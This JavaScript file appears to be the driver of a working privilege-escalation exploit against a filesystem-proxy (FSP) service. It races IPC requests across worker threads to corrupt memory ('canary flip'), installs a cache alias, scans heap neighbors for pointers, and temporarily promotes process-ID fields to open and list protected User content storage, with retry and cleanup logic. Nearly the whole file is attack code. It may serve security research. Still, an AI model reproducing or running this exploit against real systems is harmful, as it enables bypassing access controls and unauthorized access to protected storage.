        storageHandle: handles?.storageHandle || 0,
        temporaryHandle: handles?.preserveTemporaryHandleForCleanup
            ? 0 : handles?.temporaryHandle || 0,
        triggerHandle: handles?.triggerHandle || 0,
        workerStateSafe: finalWorkerStateSafe
    });
    await emitStage(formatCleanupResult(cleanup, finalWorkerStateSafe));
    return {retired, cleanup};
}

function recordCleanupState(attemptState, result, workerStateSafe,
    candidateCacheNeedsRetirement) {
    const retired = result?.retired;
    const cleanup = result?.cleanup;
    const retirementVerified = Boolean(retired && retired.ok !== false &&
        !retired.failureReason && retired.candidateHandle === 0 &&
        (!candidateCacheNeedsRetirement || retired.candidateCacheRetired ||
            retired.addressCopy?.candidateCacheRetired));
    attemptState.primaryCleanupAttempted = cleanup?.attempted === true;
    attemptState.primaryCommitVerified = cleanup?.commitTransport === 0 &&
        cleanup?.commitResult === 0;
    attemptState.primaryScratchCleanupVerified =
        cleanup?.attempted === true && cleanup?.deleteTransport === 0 &&
        cleanup?.deleteResult === 0 && cleanup?.commitTransport === 0 &&
        cleanup?.commitResult === 0;
    attemptState.primaryHandlesClosed = Boolean(cleanup?.attempted === true &&
        cleanup.handlesClosed === cleanup.expectedHandles &&
        (cleanup.closeErrors || []).length === 0);
    attemptState.endpointRetirementVerified = retirementVerified;
    attemptState.workerStateSafe = Boolean(workerStateSafe === true &&
        retired?.workerStateSafe === true && cleanup?.workerStateSafe === true);
    attemptState.cleanupVerified = Boolean(retirementVerified &&
        cleanup?.cleanupVerified === true && attemptState.workerStateSafe);
    attemptState.safeToRetry = false;
    attemptState.cleanupSummary = attemptState.cleanupVerified
        ? "cache retired, save scratch deleted and committed, all handles closed"
        : "cleanup not fully verified";
}

async function runTrackedAttempt(attemptNumber) {
    currentAttemptNumber = attemptNumber;
    const attemptState = {
        permissionProven: false,
        promotionRestored: false,
        cleanupVerified: false,
        workerStateSafe: false,
        safeToRetry: false,
        cleanupSummary: "no cleanup record",
        memoryCleanupVerified: false,
        nativeMemory: null,
        holeCleanupHandle: 0,
        holeCleanupVerified: false,
        primaryCleanupAttempted: false,
        primaryCommitVerified: false,
        primaryScratchCleanupVerified: false,
        primaryHandlesClosed: false,
        endpointRetirementVerified: false
    };
    const tracker = beginAllocationTracking();
    if (!tracker) {
        await emitStage("STOP: allocation tracking is already active; no attempt started.");
        return attemptState;
    }

    let trackingEnded = false;
    let executionError = null;
    try {
        await emitStage("Starting a fresh campaign.");
        await runPayload(attemptState);
    } catch (error) {
        executionError = String(error?.message || error);
        await emitStage("Workflow threw: " + executionError);
    } finally {
        try {
            await runHoleCleanupHandler(attemptState);
        } catch (error) {
            executionError = executionError ||
                "independent /hole cleanup threw: " +
                String(error?.message || error);
        } finally {
            trackingEnded = endAllocationTracking(tracker);
        }
    }

    let nativeMemory = {ok: false, attempted: tracker.length,
        callsCompleted: 0, errors: [], skipped: true};
    if (attemptState.cleanupVerified && attemptState.workerStateSafe &&
        attemptState.holeCleanupVerified && trackingEnded) {
        try {
            nativeMemory = {...freeTrackedAllocations(tracker), skipped: false};
        } catch (error) {
            nativeMemory = {ok: false, attempted: tracker.length,
                callsCompleted: 0, errors: [String(error)], skipped: false};
        }
    }
    attemptState.nativeMemory = nativeMemory;
    attemptState.memoryCleanupVerified = Boolean(trackingEnded && nativeMemory.ok);
    attemptState.safeToRetry = Boolean(attemptState.cleanupVerified &&
        attemptState.workerStateSafe && attemptState.holeCleanupVerified &&
        trackingEnded && nativeMemory.ok);

    await emitStage("Attempt cleanup: " + attemptState.cleanupSummary +
        "; independentHole=" +
        (attemptState.holeCleanupVerified ? "verified" : "failed") +
        "; workerState=" + (attemptState.workerStateSafe ? "safe" : "unsafe") +
        "; nativeFreeCalls=" + nativeMemory.callsCompleted + "/" +
        nativeMemory.attempted +
        (nativeMemory.ok ? " returned" : nativeMemory.skipped
            ? " skipped" : " failed") +
        (trackingEnded ? "" : "; allocation tracking did not close") + ".");
    if (executionError)
        await emitStage("Attempt ended after an exception; retry eligibility still " +
            "requires verified cleanup and native frees.");
    return attemptState;
}

export async function run() {
    const previousLogPolicy = setLogPolicy(stageOnlyLog);
    try {
        await emitStage("Bounded self-retry enabled; maximum=" + MAX_ATTEMPTS +
            "; success requires a successful User content-storage root listing.");
        for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
            const result = await runTrackedAttempt(attempt);
            if (result.permissionProven) {
                if (result.promotionRestored && result.safeToRetry) {
                    await emitStage("SUCCESS: User content-storage root listing " +
                        "verified; PID restoration, endpoint retirement, save " +
                        "cleanup, independent /hole verification, handle closure, " +
                        "and tracked frees all passed.");
                } else {
                    await emitStage("STOP: User content-storage proof succeeded, " +
                        "but restoration or complete cleanup was not verified; " +
                        "no retry will run.");
                }
                return;
            }
            if (!result.safeToRetry) {
                await emitStage("STOP: permission proof is absent and this attempt " +
                    "is not safe to repeat (" + result.cleanupSummary +"); no retry.");
                return;
            }
            if (attempt === MAX_ATTEMPTS) {
                await emitStage("CAP: no User content-storage proof after " +
                    MAX_ATTEMPTS + " attempts; last cleanup was verified.");
                return;
            }
            await emitStage("RETRY: permission proof is absent; attempt cleanup and " +
                "independent /hole verification and native frees are verified. " +
                "Waiting " + RETRY_PAUSE_MS + " ms before attempt " +
                (attempt + 1) + ".");
            currentAttemptNumber = 0;
            await waitMs(RETRY_PAUSE_MS);
        }
    } catch (error) {
        await emitStage("Workflow aborted: " + String(error?.message || error));
    } finally {
        currentAttemptNumber = 0;
        setLogPolicy(previousLogPolicy);
    }
}

async function runPayload(attemptState) {
    const config = createFspIdentityConfig();
    const helpers = createFspIdentityHelpers({
        optimizeRootCandidateScan: true,
        collectRootScanTiming: true
    });

    if (typeof checkWindow !== "function" ||
        typeof extractRoleTimings !== "function") {
        await emitStage("Wave timing helpers are unavailable; setup cannot continue.");
        return;
    }

    await emitStage("Preparing FSP and save resources...");
    const schedulingResult = await borrowRawThreadScheduling();
    if (!schedulingResult?.ok) {
        await emitStage("Raw worker scheduling failed" +
            formatFailureSuffix(schedulingResult) + ".");
        return;
    }
    const {rawScheduling} = schedulingResult;

    const sessionSetup = await openFspSessions({helpers});
    if (!sessionSetup?.ok) {
        await emitStage("Could not open the FSP or save sessions" +
            formatFailureSuffix(sessionSetup) + ".");
        return;
    }
    let handles = {...sessionSetup.handles,
        preserveTemporaryHandleForCleanup: true};
    attemptState.holeCleanupHandle = handles.temporaryHandle || 0;
    if (!attemptState.holeCleanupHandle) {
        await emitStage("No independent /hole cleanup handle; stopping before " +
            "scratch creation or worker setup.");
        helpers.cleanup(handles);
        return;
    }
    const {pktBuf} = sessionSetup;

    const scratch = await createScratchTree({
        config, helpers,
        savedHandle: handles.savedHandle,
        temporaryHandle: handles.temporaryHandle,
        handleResources: handles
    });
    if (!scratch?.ok) {
        await emitStage("Could not prepare the save:/hole scratch tree" +
            formatFailureSuffix(scratch) + ".");
        return;
    }

    let cleanupAttempted = false;
    let cleanupWorkerStateSafe = true;
    let addressCopy = null;
    const stopAndCleanup = async options => {
        cleanupAttempted = true;
        const result = await performStopAndCleanup(options);
        recordCleanupState(attemptState, result, options.workerStateSafe,
            Boolean(options.candidateCacheNeedsRetirement ||
                options.addressCopy?.candidateCacheNeedsRetirement));
        return result;
    };
    try {
    const storageSetup = await openStorageAndClones({
        helpers, SCRATCH_DIR: scratch.SCRATCH_DIR,
        rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        handleResources: handles
    });
    if (!storageSetup?.ok) {
        cleanupAttempted = true; // This step already removed /hole and closed handles.
        await emitStage("Could not open the storage or clone handles" +
            formatFailureSuffix(storageSetup) + ".");
        return;
    }
    handles = {...handles, ...storageSetup};

    const triggerSetup = await openTriggerHandles({
        helpers, SCRATCH_DIR: scratch.SCRATCH_DIR,
        savedHandle: handles.savedHandle,
        temporaryHandle: handles.temporaryHandle,
        handleResources: handles
    });
    if (!triggerSetup?.ok) {
        cleanupAttempted = true; // This step already removed /hole and closed handles.
        await emitStage("Could not open the trigger handles" +
            formatFailureSuffix(triggerSetup) + ".");
        return;
    }
    handles = {...handles, ...triggerSetup};
    await emitStage("FSP and save resources are ready.");

    await emitStage("Preparing IPC requests and worker resources...");
    const buffers = allocatePacketBuffers({
        config, SCRATCH_DIR: scratch.SCRATCH_DIR,
        canaryPath: scratch.canaryPath
    });
    if (!buffers?.ok) {
        await emitStage("Could not allocate the packet buffers.");
        return;
    }

    const packets = buildIpcRequests({
        config,
        canaryBufMem: buffers.canaryBufMem,
        canaryPath: scratch.canaryPath,
        fillerBuf0: buffers.fillerBuf0,
        fillerBuf1: buffers.fillerBuf1,
        fragmentBufs: buffers.fragmentBufs,
        guardBuf0: buffers.guardBuf0,
        guardBuf1: buffers.guardBuf1,
        triggerBuf: buffers.triggerBuf
    });
    if (!packets?.ok) {
        await emitStage("Could not build the IPC request packets.");
        return;
    }

    const pathPair = await checkPathPair({
        helpers, SCRATCH_DIR: scratch.SCRATCH_DIR,
        fillerDst: buffers.fillerDst, fillerSrc: buffers.fillerSrc,
        guardPath: buffers.guardPath, guardPathC: buffers.guardPathC,
        rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        handleResources: handles
    });
    if (!pathPair?.ok) {
        cleanupAttempted = true; // This step already removed /hole and closed handles.
        await emitStage("Path-pair control or auxiliary storage setup failed" +
            formatFailureSuffix(pathPair) + ".");
        return;
    }
    handles = {...handles, ...pathPair};

    const cmifSetup = applyCmifContexts({
        REQ: packets.REQ, clearPkt: packets.clearPkt,
        pinPkt: packets.pinPkt, prePkt: packets.prePkt
    });
    if (!cmifSetup?.ok) {
        await emitStage("Could not apply the IPC message contexts.");
        return;
    }

    const waveInfrastructure = await prepareWaveInfrastructure({
        config, helpers, REQ: packets.REQ,
        clearPkt: packets.clearPkt, pinPkt: packets.pinPkt,
        prePkt: packets.prePkt, rootClones: handles.rootClones,
        saveClones: handles.saveClones,
        rootSession: handles.rootSession,
        storageHandle: handles.storageHandle,
        triggerBuf: buffers.triggerBuf,
        triggerHandle: handles.triggerHandle
    });
    if (!waveInfrastructure?.ok) {
        await emitStage("Could not prepare the workers and synchronization gates.");
        return;
    }
    await emitStage("IPC requests and worker resources are ready.");

    await emitStage("Looking for a qualified canary flip...");
    cleanupWorkerStateSafe = false;
    const control = await runControlWaveLoop({
        config, helpers, REQ: packets.REQ,
        dirtyFilePath: scratch.dirtyFilePath,
        extentTriggerHandle: handles.extentTriggerHandle,
        gates: waveInfrastructure.gates,
        pinHandle: handles.pinHandle,
        pinPkt: packets.pinPkt, pktBuf: pktBuf,
        rawScheduling, rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        sendIndices: waveInfrastructure.sendIndices,
        triggerHandle: handles.triggerHandle,
        waveData: waveInfrastructure.waveData,
        waveExtra: waveInfrastructure.waveExtra,
        workerResources: waveInfrastructure.workerResources,
        SCRATCH_DIR: scratch.SCRATCH_DIR,
        abortControlCanonical: scratch.abortControlCanonical,
        canaryPath: scratch.canaryPath,
        clearPkt: packets.clearPkt,
        clearSendIndex: waveInfrastructure.clearSendIndex,
        extentTotal: buffers.extentTotal,
        fragmentBufs: buffers.fragmentBufs,
        prePkt: packets.prePkt,
        preSendIndex: waveInfrastructure.preSendIndex,
        pinSendIndex: waveInfrastructure.pinSendIndex,
        segments: scratch.segments,
        selectedDir: scratch.selectedDir,
        setupPath: scratch.setupPath, setupPkt: scratch.setupPkt,
        triggerBuf: buffers.triggerBuf,
        reportProgress: emitCanaryProgress
    });
    cleanupWorkerStateSafe = control?.workerStateSafe === true;
    await emitStage(formatCanaryResult(control, config));
    // These lines consume records already collected by the wave loop. They
    // are emitted only after it finishes, so they cannot shift wave timing.
    await emitPositiveWindowDiagnostics(control, config);
    handles = {...handles, pinHandle: control?.pinHandle || handles.pinHandle};
    if (!control?.ok) {
        await stopAndCleanup({
            reason: "Canary campaign stopped before qualification; skipping later phases.",
            scratch, handles, helpers,
            workerStateSafe: control?.workerStateSafe === true
        });
        return;
    }
    if (control.canaryQualified !== true) {
        await stopAndCleanup({
            reason: "Canary did not flip; skipping candidate storage, cache alias, heap scan, address qualification and promotion.",
            scratch, handles, helpers,
            workerStateSafe: control.workerStateSafe
        });
        return;
    }

    await emitStage("Preparing candidate storage...");
    const candidateSetup = await preparePostCanaryCandidate({
        config, helpers, canaryQualified: control.canaryQualified,
        pktBuf: pktBuf,
        rootSession: handles.rootSession,
        storageHandle: handles.storageHandle,
        workerStateSafe: control.workerStateSafe
    });
    if (candidateSetup?.candidateHandle && candidateSetup?.primeHex &&
        !candidateSetup?.failureReason) {
        await emitStage("Candidate storage is ready.");
    } else if (candidateSetup?.candidateHandle && candidateSetup?.primeHex) {
        await emitStage("Candidate storage opened, but its verification failed " +
            "(reason=" + candidateSetup.failureReason + ").");
    } else {
        await emitStage("Candidate storage is unavailable (reason=" +
            (candidateSetup?.failureReason || "unknown") + ").");
    }
    handles = {...handles,
        candidateHandle: candidateSetup?.candidateHandle || 0};
    if (!candidateSetup?.ok || candidateSetup.canaryQualified !== true ||
        !candidateSetup.candidateHandle || !candidateSetup.primeHex ||
        candidateSetup.failureReason) {
        await stopAndCleanup({
            reason: "Candidate storage is not fully qualified; skipping cache alias and later phases.",
            scratch, handles, helpers,
            workerStateSafe: control.workerStateSafe
        });
        return;
    }

    await emitStage("Installing the cache alias...");
    const aliasStartedAt = Date.now();
    cleanupWorkerStateSafe = false;
    const alias = await installCacheAlias({
        config, helpers, REQ: packets.REQ,
        canaryQualified: candidateSetup.canaryQualified,
        candidateHandle: candidateSetup.candidateHandle,
        dirtyFilePath: scratch.dirtyFilePath,
        dirtyWriteBuf: control.dirtyWriteBuf,
        dirtyWritePkt: control.dirtyWritePkt,
        gates: waveInfrastructure.gates, pinPkt: packets.pinPkt,
        pktBuf: pktBuf, primeHex: candidateSetup.primeHex,
        rawScheduling, rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        sendIndices: waveInfrastructure.sendIndices,
        triggerHandle: handles.triggerHandle,
        waveData: waveInfrastructure.waveData,
        waveExtra: waveInfrastructure.waveExtra,
        wavesJoined: control.wavesJoined,
        wavesStarted: control.wavesStarted,
        workerResources: waveInfrastructure.workerResources,
        workerStateSafe: control.workerStateSafe,
        abortControlCanonical: scratch.abortControlCanonical,
        canaryPath: scratch.canaryPath,
        clearPkt: packets.clearPkt,
        clearSendIndex: waveInfrastructure.clearSendIndex,
        fragmentBufs: buffers.fragmentBufs,
        pinFirstWaveQualified: control.pinFirstWaveQualified,
        pinHandle: control.pinHandle,
        pinSendIndex: waveInfrastructure.pinSendIndex,
        prePkt: packets.prePkt,
        preSendIndex: waveInfrastructure.preSendIndex,
        setupPath: scratch.setupPath, setupPkt: scratch.setupPkt,
        triggerBuf: buffers.triggerBuf,
        reportProgress: emitProgress
    });
    cleanupWorkerStateSafe = alias?.workerStateSafe === true;
    const aliasElapsedMs = Date.now() - aliasStartedAt;
    await emitStage(formatAliasResult(alias) +
        formatAliasTiming(alias, aliasElapsedMs));

    const analysisResources = {
        config, REQ: packets.REQ,
        clearPkt: packets.clearPkt,
        clearSendIndex: waveInfrastructure.clearSendIndex,
        gates: waveInfrastructure.gates,
        pinFirstWaveQualified: control.pinFirstWaveQualified,
        pinHandle: control.pinHandle, pinPkt: packets.pinPkt,
        pinSendIndex: waveInfrastructure.pinSendIndex,
        pktBuf: pktBuf, prePkt: packets.prePkt,
        preSendIndex: waveInfrastructure.preSendIndex,
        rootSession: handles.rootSession,
        sendIndices: waveInfrastructure.sendIndices,
        abortControlCanonical: scratch.abortControlCanonical,
        canaryPath: scratch.canaryPath,
        savedHandle: handles.savedHandle,
        setupPath: scratch.setupPath, setupPkt: scratch.setupPkt
    };
    addressCopy = {
        config, REQ: packets.REQ,
        candidateCacheNeedsRetirement:
            Boolean(alias?.candidateCacheNeedsRetirement),
        copyWavesTotal: alias?.copyWavesTotal || 0,
        dirtyFilePath: scratch.dirtyFilePath,
        dirtyWriteBuf: control.dirtyWriteBuf,
        dirtyWritePkt: control.dirtyWritePkt,
        gates: waveInfrastructure.gates, pinPkt: packets.pinPkt,
        pktBuf: pktBuf, rawScheduling,
        rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        sendIndices: waveInfrastructure.sendIndices,
        triggerHandle: handles.triggerHandle,
        waveData: waveInfrastructure.waveData,
        waveExtra: waveInfrastructure.waveExtra,
        wavesJoined: alias?.wavesJoined || 0,
        wavesStarted: alias?.wavesStarted || 0,
        workerResources: waveInfrastructure.workerResources,
        workerStateSafe: alias?.workerStateSafe === true,
        fragmentBufs: buffers.fragmentBufs,
        triggerBuf: buffers.triggerBuf,
        analysis: analysisResources
    };
    if (!alias?.ok || (!alias.aliasInstalled &&
        alias.copyStepsCompleted === 0)) {
        await stopAndCleanup({
            reason: "Cache alias produced no completed copy step; skipping heap and address scans.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(alias?.candidateCacheNeedsRetirement),
            workerStateSafe: alias?.workerStateSafe === true
        });
        return;
    }

    await emitStage("Preparing heap-neighbor storages...");
    const releaseSetup = await prepareReleaseNeighbors({
        aliasInstalled: alias.aliasInstalled,
        candidateHandle: handles.candidateHandle,
        config, copyStepsCompleted: alias.copyStepsCompleted,
        rootSession: handles.rootSession
    });
    if (!releaseSetup?.ok) {
        await emitStage("Could not prepare the heap-neighbor storages.");
        await stopAndCleanup({
            reason: "Neighbor storage setup failed; skipping heap and address scans.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(alias.candidateCacheNeedsRetirement),
            workerStateSafe: addressCopy.workerStateSafe
        });
        return;
    }
    handles = {...handles,
        extraStorages: releaseSetup.extraStorages || []};
    if (releaseSetup.eligible) {
        await emitStage(releaseSetup.extraStorages.length + "/" +
            releaseSetup.expectedStorages + " maximum storages ready (attempted=" +
            releaseSetup.attemptedStorages + ")" +
            (releaseSetup.failureReason
                ? "; stopped=" + releaseSetup.failureReason + "." : "."));
    } else {
        await emitStage("Neighbor scan skipped (candidate=" +
            (handles.candidateHandle ? "ready" : "unavailable") +
            "; alias=" + (alias.aliasInstalled ? "installed" : "not-installed") +").");
        await stopAndCleanup({
            reason: "Neighbor scan is ineligible; skipping heap snapshot, pointer search, address qualification and promotion.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(alias.candidateCacheNeedsRetirement),
            workerStateSafe: addressCopy.workerStateSafe
        });
        return;
    }

    let baseline = null;
    let release = {
        ok: true, extraStorages: releaseSetup.extraStorages,
        pointerCandidates: [], releaseRounds: 0, totalChangedLinks: 0,
        stopReason: releaseSetup.eligible ? "baseline-not-run" : "scan-ineligible"
    };
    if (releaseSetup.eligible) {
        await emitStage("Capturing the initial heap snapshot...");
        baseline = await captureReleaseBaseline({
            config, candidateHandle: handles.candidateHandle,
            primeHex: candidateSetup.primeHex, helpers
        });
        if (baseline?.snapshotOk) {
            await emitStage("Heap baseline captured (" + baseline.prevEnd +
                " bytes; alias prefix matched).");
        } else {
            await emitStage("Heap baseline rejected (read=" +
                formatCode(baseline?.readError) + "; prefixMatched=" +
                Boolean(baseline?.prefixMatches) + "; dataBytes=" +
                (baseline?.prevEnd || 0) + ").");
        }

        await emitStage("Scanning neighboring releases for pointer candidates...");
        release = await releaseNeighborsAndFindPointers({
            config, candidateHandle: handles.candidateHandle,
            primeHex: candidateSetup.primeHex,
            extraStorages: releaseSetup.extraStorages,
            baseline, helpers
        });
        if (!release?.ok) {
            await emitStage("Pointer scan failed (reason=" +
                (release?.stopReason || "unknown") + ").");
        } else if (release.stopReason === "baseline-not-qualified") {
            await emitStage("Pointer scan skipped because the baseline was not qualified.");
        } else if (release.pointerCandidates.length) {
            await emitStage(release.pointerCandidates.length +
                " qualified candidates found across " + release.releaseRounds +
                " rounds (changed links=" + release.totalChangedLinks +
                (release.stopReason ? "; stopped=" + release.stopReason : "") +
                (release.readError !== null && release.readError !== undefined
                    ? "; readError=" + formatCode(release.readError) : "") + ").");
        } else {
            await emitStage("No qualified pointer candidates found across " +
                release.releaseRounds + " rounds (changed links=" +
                release.totalChangedLinks +
                (release.stopReason ? "; stopped=" + release.stopReason : "") +
                (release.readError !== null && release.readError !== undefined
                    ? "; readError=" + formatCode(release.readError) : "") + ").");
        }
    } else {
        await emitStage("Heap baseline skipped because the neighbor scan was ineligible.");
        await emitStage("Pointer scan skipped because the neighbor scan was ineligible.");
    }
    handles = {...handles,
        extraStorages: release?.extraStorages || releaseSetup.extraStorages || []};
    if (!release?.ok) {
        await stopAndCleanup({
            reason: "Pointer scan failed; skipping address qualification and promotion.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(alias.candidateCacheNeedsRetirement),
            workerStateSafe: addressCopy.workerStateSafe
        });
        return;
    }
    if (!release.pointerCandidates?.length) {
        await stopAndCleanup({
            reason: "No qualified pointer candidates; skipping address qualification and promotion.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(alias.candidateCacheNeedsRetirement),
            workerStateSafe: addressCopy.workerStateSafe
        });
        return;
    }

    await emitStage("Qualifying the cache period and address plan...");
    const addressStartedAt = Date.now();
    cleanupWorkerStateSafe = false;
    const address = await qualifyAddressPlan({
        config, helpers, addressCopy,
        aliasInstalled: alias.aliasInstalled,
        candidateHandle: handles.candidateHandle,
        collectTimingProfile: true,
        reportProgress: emitProgress,
        pointerCandidates: release.pointerCandidates,
        primeHex: candidateSetup.primeHex,
        rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        storageHandle: handles.storageHandle
    });
    cleanupWorkerStateSafe = address?.addressCopy?.workerStateSafe === true;
    const addressElapsedMs = Date.now() - addressStartedAt;
    for (const message of formatAddressResults(address, addressElapsedMs))
        await emitProgress(message);
    handles = {...handles, domainSession: address.domainSession};
    addressCopy = address?.addressCopy || addressCopy;
    if (!address?.ok || !address.addressReadVerified ||
        !address.rootStageVerified || !address.verifiedIdentityTargets ||
        !address.addressPlan || !address.domainSession) {
        const skipReason = promotionSkipReason(address, handles)
            .replace(/-/g, " ");
        await stopAndCleanup({
            reason: "Address or root identity was not fully verified (" +
                skipReason + "); skipping PID promotion.",
            scratch, handles, helpers, addressCopy,
            candidateCacheNeedsRetirement:
                Boolean(addressCopy?.candidateCacheNeedsRetirement),
            workerStateSafe: addressCopy?.workerStateSafe === true,
            domainSession: address.domainSession
        });
        return;
    }

    await emitStage("Temporarily promoting the verified PID fields and checking User storage...");
    cleanupWorkerStateSafe = false;
    const promotion = await runPromotionStep({
        config, addressPlan: address.addressPlan,
        addressCopy: address.addressCopy,
        addressReadVerified: address.addressReadVerified,
        candidateHandle: handles.candidateHandle,
        domainSession: handles.domainSession,
        helpers, rootStageVerified: address.rootStageVerified,
        verifiedIdentityTargets: address.verifiedIdentityTargets,
        workerStateSafe: address.addressCopy.workerStateSafe
    });
    cleanupWorkerStateSafe = promotion?.workerStateSafe === true;
    addressCopy = promotion?.addressCopy || address.addressCopy;
    const promotionOutcome = promotion?.promotionOutcome || {};
    attemptState.permissionProven = Boolean(promotion?.promotionAttempted &&
        promotionOutcome.promoted === true &&
        promotionOutcome.openedUserFs === true &&
        promotionOutcome.listedUserRoot === true &&
        promotionOutcome.listTransport === 0 &&
        promotionOutcome.listResult === 0);
    attemptState.promotionRestored = promotion?.promotionRestored === true;
    await emitFastStage("Permission proof: " +
        (attemptState.permissionProven
            ? "User content-storage opened and / listed successfully"
            : "not established") +
        "; PID restoration=" +
        (attemptState.promotionRestored ? "verified" :
            promotion?.promotionAttempted ? "failed" : "not attempted") + ".");
    await emitStage(formatPromotionResult(promotion, address, handles));

    await emitStage("Retiring the retained endpoint...");
    cleanupWorkerStateSafe = false;
    const retired = await retireCandidateCacheAndClose({
        helpers, addressCopy: promotion.addressCopy || address.addressCopy,
        candidateCacheNeedsRetirement:
            (promotion.addressCopy || address.addressCopy).candidateCacheNeedsRetirement,
        candidateHandle: handles.candidateHandle,
        retireRetainedEndpoint: promotion.retireRetainedEndpoint,
        workerStateSafe: promotion.workerStateSafe
    });
    cleanupWorkerStateSafe = retired?.workerStateSafe === true;
    addressCopy = retired?.addressCopy || addressCopy;
    await emitStage(formatRetirementResult(retired));
    handles = {...handles, candidateHandle: retired.candidateHandle};

    await emitStage("Removing save:/hole and closing the remaining handles...");
    cleanupAttempted = true;
    const cleanup = await cleanupScratchAndHandles({
        SCRATCH_DIR: scratch.SCRATCH_DIR,
        auxiliaryStorageHandle: handles.auxiliaryStorageHandle,
        candidateHandle: handles.candidateHandle,
        candidateCacheNeedsRetirement:
            retired.addressCopy.candidateCacheNeedsRetirement,
        candidateCacheRetired: retired.candidateCacheRetired,
        retainedEndpointActive: retired.addressCopy.retainedEndpointActive,
        domainSession: handles.domainSession,
        extentTriggerHandle: handles.extentTriggerHandle,
        extraStorages: handles.extraStorages,
        pinHandle: handles.pinHandle,
        rootClones: handles.rootClones,
        rootSession: handles.rootSession,
        saveClones: handles.saveClones,
        savedHandle: handles.savedHandle,
        storageHandle: handles.storageHandle,
        temporaryHandle: 0,
        triggerHandle: handles.triggerHandle,
        workerStateSafe: retired.workerStateSafe
    });
    await emitStage(formatCleanupResult(cleanup, retired.workerStateSafe));
    recordCleanupState(attemptState, {retired, cleanup},
        retired.workerStateSafe,
        Boolean(retired.addressCopy?.candidateCacheNeedsRetirement));
    } finally {
        if (!cleanupAttempted) {
            await stopAndCleanup({
                reason: "Workflow exited before its planned cleanup; attempting guarded cleanup.",
                scratch, handles, helpers, addressCopy,
                candidateCacheNeedsRetirement:
                    Boolean(addressCopy?.candidateCacheNeedsRetirement),
                workerStateSafe: cleanupWorkerStateSafe,
                domainSession: handles?.domainSession || null
            });
        }
    }
}
